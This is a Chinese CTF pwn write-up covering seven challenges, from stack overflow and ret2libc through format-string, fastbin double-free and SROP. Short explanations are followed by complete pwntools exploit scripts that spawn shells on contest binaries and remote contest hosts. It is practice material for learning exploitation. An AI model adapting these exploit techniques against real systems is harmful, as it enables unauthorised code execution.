# Overflow

32位的栈溢出，找到offset即可，看不懂汇编的逻辑的话就在gdb里面慢慢调

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YzZkM2ZhZDg5YTA2ODczNjc1YjMwY2EzODVjNDY5MzdfQlJDZVdFdmRLYVozc092eHhiY1k5S1BvYzJvclVVNndfVG9rZW46QU9oMmJ4ek9tb3E5REF4YzdJdWNXcWVqbkxlXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

这里可以看到`gets`函数是向栈上读入数据的

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWYyYzJmNDRkMGFmNGQ0YzllMWJiZTIyYTkyNDlkZjlfdno1cGE4M1RmdmxJdXFLV2FwQkZMajhtWTNaWTB6UFpfVG9rZW46SjBzYmJtc25kb09CRTZ4OVRveWNNcms5bkpmXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

读入完数据后将`esp`迁移到`ebp-8`的位置，而这个位置我们是可以覆盖到的，然后开始将栈上的数据给`pop`出来给寄存器，接着将`esp`转移到`ecx-4`的位置，也就是说我们只要控制了`ecx`的位置就可以做到劫持程序

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MzExYzUzY2VkODk5MDY1NTdlZjI4Mjg4MjJhMzYzMDRfTExRMWVKMGl5ZTRNd0xRNDd4RTJuckl2dmhwcllaNGpfVG9rZW46SDFDNmIzd09hb3E4UkN4Q2JUUmNZT1A1blNmXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

这里也可以看到我们将`ecx`设置为`0x80ef32c`，其实也就是第一步`read`函数读入的位置，第一个`read`函数我们构造了一段`ROP`链来获取`shell`，这里`esp`迁移过来后就可以开始执行我们的`ROP`链来获取shell

```Python
from pwn import *

context(arch="i386", os="linux", log_level="debug")
local = False
elf_path = "./overflow"
libc_path = ""
if local:
    p = process(elf_path)
else:
    ip, port = "node2.tgctf.woooo.tech:30712".split(":")
    p = remote(ip, int(port))

def debug():
    if local:
        gdb.attach(p, 'b *0x80498b8')

name = 0x80ef320
syscall = 0x8064acd
pop_eax = 0x80b470a
pop_ebx = 0x8049022
pop_ecx = 0x08049802
pop_edx = 0x08060bd1
int_80 = 0x8073d6f
p.recvuntil(b'name?\n')
payload = b'/bin/sh\x00'
payload += p32(pop_eax) + p32(0xb)
payload += p32(pop_ebx) + p32(name)
payload += p32(pop_ecx) + p32(0)
payload += p32(pop_edx) + p32(0)
payload += p32(int_80)
debug()
p.send(payload)
payload = b'a' * (0x28) + p32(name + 0x8) + b'a' * (0xc0 - 0x28 + 0x4) + p32(name + 0x8 + 0x4)
# payload += p32(pop_ebx) + p32(name) + p32(pop_eax) + p32(0xb) + p32(syscall)
p.recvuntil(b'right?\n')
p.sendline(payload)

p.interactive()
```

# Shellcode

除rdi和rip以外全部置零，只能读入0x12长度的shellcode

```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
elf_path = "./shellcode"
libc_path = ""
if local:
    p = process(elf_path)
else:
    ip, port = "node2.tgctf.woooo.tech:31008".split(":")
    p = remote(ip, int(port))

shellcode = asm('''
    mov al, 0x3b
    add rdi, 0x8
    syscall
''')

# gdb.attach(p)
p.send(shellcode + b'/bin/sh\x00')
p.interactive()
```

# Stack

有一个比较函数，通过这个函数后就可以控制rdi,rax,rdx,可以ret2syscall

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YmNlMThhODZlZjJjMjI5OGM5NDY5M2FmMDBlNDRkYWFfS2xyV3BzY01ialJ0dWNBVnRVVFU3ekoySXl1NGVpYXpfVG9rZW46V2dDbGI1RlhSbzBFSTJ4NUxLR2NHdUFybkZjXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NGIzMWRhMWJlNWJhYzc3ZDcxZWI0ZTU0ZWRhNmM4ZGFfMDNRajd5ZWRRRGlXVDlmbVhoS05ETTNReVdjbjZGbjVfVG9rZW46Um56T2J0aVZob0lrRDF4endhdGNGeThJbkhiXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

```Python
from pwn import *
from wstube import websocket

context(arch="amd64", os="linux", log_level="debug")
local = True
elf_path = './stack'
libc_path = './'
if local:
    p = process(elf_path)
    gdb.attach(p, '''
        b *0x4011ff
        b *0x401230
        b *0x4011b6
    ''')
else:
    ip, port = "node1.tgctf.woooo.tech:32106".split(":")
    p = remote(ip, port)
    # p = websocket('wss://tgctf.woooo.tech/api/traffic/FIqeaa6PBG4X6fJy2M9Qf?port=9999')

payload1 = b'/bin/sh\x00' + b"A" * (0x38)
payload1 += p64(59)
payload1 += p64(0x404060)
payload1 += p64(0x0) * 4
p.sendlineafter(b'name?\n', payload1)
p.recvuntil(b'say?\n')
payload2 = b'a' * 0x40
payload2 += p64(0x404060)
payload2 += p64(0)
p.sendline(payload2)

p.interactive()
```

# Signin

普通的ret2libc

```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = True
if local:
    p = process("./signin")
else:
    ip, port = "node1.tgctf.woooo.tech:32634".split(":")
    p = remote(ip, port)

elf = ELF("./signin")
libc = ELF("./libc.so.6")

p.recvuntil(b'name.\n')
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main = elf.symbols["main"]
pop_rdi = 0x401176
ret = 0x40101a

payload = b"A" * (0x70 + 0x8)
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)

p.sendline(payload)
gdb.attach(p, 'b main')

puts_addr = u64(p.recv(6).ljust(8, b"\x00"))
libc_base = puts_addr - libc.symbols["puts"]
log.success(f"Libc base: {hex(libc_base)}")
log.success(f"puts address: {hex(puts_addr)}")
system = libc_base + libc.symbols["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
payload = b"A" * (0x70 + 0x8)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(system)
pause()
p.sendline(payload)

p.interactive()
```

# Fmt

做这题的时候一直在想办法让程序循环起来但最终是没找到办法，看了wp才知道方法

这题应该是用到了 call 的一个特点

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRlYmYyZGQ4MjNlNDUyZmIyM2Y5NjQ0M2MyYzk2N2RfU1NxN1hjNnBibzRucVZ1OEZzV3dRN2QzOXd1ZGIxczZfVG9rZW46QldBeGJ6UDlBb09nU2p4bFR5SWNZZG9tbktmXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

这里可以看到`rsp`指针是指向我们读入的`stack`的位置的，

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YWY4ZTZmYmQyMDM5MmJkYzhjZWZlYWNmZTExODBmYTZfbnNrZm9xYXNZT3g4aG1Jdkx6MUR2TElETG9QaEtuMGVfVG9rZW46TmltR2J4NzZhb1NIV0p4cTlxdWN6elNRbmJIXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

我们进入`printf`函数中可以看到`rsp`往回了`0x8`的位置，这里这个`0x401276`就是`printf`函数后面接着的code段的地址

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=NzUxZTMwODRkZDY2MWNmODEzZmJlNTQ3MjVmMWU5YzVfbzViNVh3RzZodHB5bjZFZnhXTVQ1ZGI4aTRlQnBON3VfVG9rZW46QklFcmJsNXFhb3RlTVd4RXAxUmNTYlRsbjJmXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

这里就可以看到最后是返回了`0x401276`的位置，如果我们将这里的位置修改了呢

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=M2UzNWEwZGIyZDNkNjdhMWYwYmZlYTk4ODJhMzIzY2JfeXYzS2J4SWwzUVNGVFM2VUJHb2FiUkNseUd4aXZqQTZfVG9rZW46VnRDMGJreFR2b0NRREx4MThuZmNFakF4bmJoXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

可以看到这里将`rsp`指向的`stack`的内容修改后返回的地址也修改了，那么就很明确了，这个位置控制的是`printf`函数执行后的返回地址，我们将这个位置修改后就能在劫持`printf`执行后的返回。

那么回到这道题，这道题在执行一次`printf`后会立刻修改`magic`变量，使得即使我们修改了返回地址想要多次执行格式化字符串漏洞也无法实现。那么我们这里就可以通过刚刚这个点，修改`printf`函数的返回地址，让其不执行`magic = 0`这条语句，并将printf函数的返回地址改为函数起始，这样就可以再次利用`printf`函数漏洞。

![](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YzdjZGVlMmQyY2QwM2Q0ZjEyNDc3MzE3NWZlOWEyYjRfeVlFZE50RnREZGhjblBqeXRBVTlHRnc3cDduUGVrdk9fVG9rZW46UjRNYWJKaFQ2b25SVXV4TTdmNWNvQXJCbjZiXzE3NDUxMzcyNjk6MTc0NTE0MDg2OV9WNA)

剩下的思路就很明显了，第一次格式化字符串漏洞泄漏`libc`并劫持`printf`返回函数到`main`函数的起始，然后第二次构造格式化字符串漏洞修改返回地址为`ogg`即可`get shell`。

```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
p = process("./fmt")

def debug():
    gdb.attach(p, '''
        b *0x4012e4
    ''')

p.recvuntil(b'gift ')
stack = int(p.recvline().strip(), 16)
log.info(f"stack: {hex(stack)}")
p.recvuntil(b'name')
payload = b'%12c%18$hhn'.ljust(0x8, b'a')
payload = b'%4539c%10$hn-%19$p-'.ljust(0x20, b'a')
payload += p64(stack - 0x8)
debug()
p.sendline(payload)
p.recvuntil(b'\x2d')
__libc_start_main = int(p.recv(14).strip(), 16) - 243
log.info(f"__libc_start_main: {hex(__libc_start_main)}")
libc = ELF("./libc.so.6")
libc.address = __libc_start_main - libc.symbols['__libc_start_main']
log.info(f"libc: {hex(libc.address)}")
ogg = libc.address + 0xe3b01
log.success(f"ogg: {hex(ogg)}")
payload = fmtstr_payload(6, {stack + 0x8: ogg}, write_size='int')
p.sendline(payload)

p.interactive()
```

# Heap

已经通过 fastbins 和 unsorted bins 获取了 libc 基址，只需要再劫持`__malloc_hook`为 ogg 就能 get shell，可以找到在`__malloc_hook - 0x23`的位置可以构造一个`fake chunk`，大小为 0x70 左右，那么我们申请的大小就需要小于 0x70 ，比赛时一直没注意到这点导致一直 malloc 失败，修改之后就可以用 double free 来修改`__malloc_hook`来 get shell

__malloc_hook [Heap](https://hnusec-team.feishu.cn/wiki/XrWxwFQJ4in8RbkE37Bcid4Snkc?larkTabName=space#share-BP3zdCZNqosPIAxTesPc8QYwnoe)

```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = True
debug_mode = True
elf_path = "./heap"
libc_path = "./libc.so.6"
if local:
    p = process(elf_path)
else:
    ip, port = ":".split(":")
    p = remote(ip, int(port))

def debug():
    if local and debug_mode:
        gdb.attach(p, '''
            b main
            b *0x40089e
            b *0x400a81
            b *0x4009cd
        ''')

def choose(idx):
    p.recvuntil("> ")
    p.sendline(str(idx))

def add(size, content):
    choose(1)
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    p.send(content)

def free(idx):
    choose(2)
    p.recvuntil("> ")
    p.sendline(str(idx))

def change(name):
    choose(3)
    p.recvuntil("> ")
    p.send(name)

libc = ELF(libc_path)
bss_name = 0x6020c0
chunk_list = 0x6021a0

name = flat([
    0, 0x91
]).ljust(0x90, b"\x00")
name += flat([
    0, 0x31
]).ljust(0x30, b"\x00")
name += flat([
    0, 0x71
])
p.sendlineafter("> ", name)
add(0x60, b"0" * 0x20)#0
add(0x60, b"1" * 0x20)#1
add(0x60, b"2" * 0x20)#2
free(0)
free(1)
free(0)
add(0x60, p64(bss_name + 0xc0))#3
add(0x60, b"4" * 0x20)#4
add(0x60, b'5' * 0x20)#5
add(0x60, p64(0xdeadbeef) + p64(0) + p64(0x6020d0))#6
free(0)
change(b'a' * 0xf + b'b')
p.recvuntil(b'ab')
main_arena = u64(p.recv(6) + b'\x00\x00')
log.success(f"main_arena: {hex(main_arena)}")
__malloc_hook = main_arena - 0x68
log.success(f"__malloc_hook: {hex(__malloc_hook)}")
libc_base = __malloc_hook - libc.symbols['__malloc_hook']
log.success(f"libc_base: {hex(libc_base)}")
# change(p64(0) + p64(0x91) + p64(0) + p64(libc_base + 0x3c67f8 - 0x10))
#add(0x80, p64(0xdeadbeef))#7
free(3)
free(4)
free(3)
add(0x60, p64(__malloc_hook - 0x23))#8
log.info(f"fake_fast: {hex(__malloc_hook - 0x23)}")
add(0x60, b"9" * 0x20)#9
add(0x60, b"a" * 0x20)#10
gadgets = [0x4527a, 0xf03a4, 0xf1247]
ogg = libc_base + gadgets[2]
debug()
add(0x60, b"b" * 0x13 + p64(ogg))#11
choose(1)
p.recvuntil("> ")
p.sendline(b'32')

p.interactive()
```

# Noret

没有ret，可以找到控制点，构造SROP即可

```Python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
local = False
elf_path = './noret'
libc_path = './'
if local:
    p = process(elf_path)
    # gdb.attach(p, 'b main')
else:
    ip, port = "node1.tgctf.woooo.tech:31194".split(":")
    p = remote(ip, port)

def debug():
    if local:
        gdb.attach(p, '''
            b *0x401010
            b *0x4010fd
        ''')

def choose(idx):
    p.sendlineafter(b'> ', str(idx).encode())

def accept():
    choose(1)

def exit():
    choose(3)

def submit(content):
    choose(2)
    p.sendafter(b'feedback: ', content)

pop_rcx_jmp_qrdx = 0x401029
pop_rdi_rcx_rdx_jmp_qrdi_1 = 0x401010
pop_rdx_jmp_qrcx = 0x401021 
mov_rsi_q_rcx_10_jmp_qrdx = 0x40101b
add_rax_rdx_jmp_qrcx = 0x401024
syscall = 0x4010e0

choose(4)
stack = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"stack address: {hex(stack)}")

frame1 = SigreturnFrame()
frame1.rax = constants.SYS_execve
frame1.rdi = stack - (0x100 - 0x8)
frame1.rsi = 0
frame1.rdx = 0
frame1.rip = syscall
# 这里不修改这两个的话长度不够，修改后不影响SROP的执行
frame1.__reserved = pop_rdi_rcx_rdx_jmp_qrdi_1
frame1.sigmask = stack + 0x20 - 0x1
# 控制点的逻辑是控制rax为0xf后将rsp跳转到frame的顶上，然后pop之后rsp刚好在frame的顶部
payload = flat([
    stack - 0x50 - 0x1 + 0x10, 
    b'/bin/sh\x00',
     0,
    frame1,
    stack + 0x28, 0xfffffffffffffff9,
    add_rax_rdx_jmp_qrcx,
    0x401155,
    0x40100f, # pop rsp ; pop rdi ; pop rcx ; pop rdx ; jmp qword ptr [rdi + 1]
    stack - 0x100,
])

debug()
submit(payload)

p.interactive()
```

# Onlygets

  

# qheap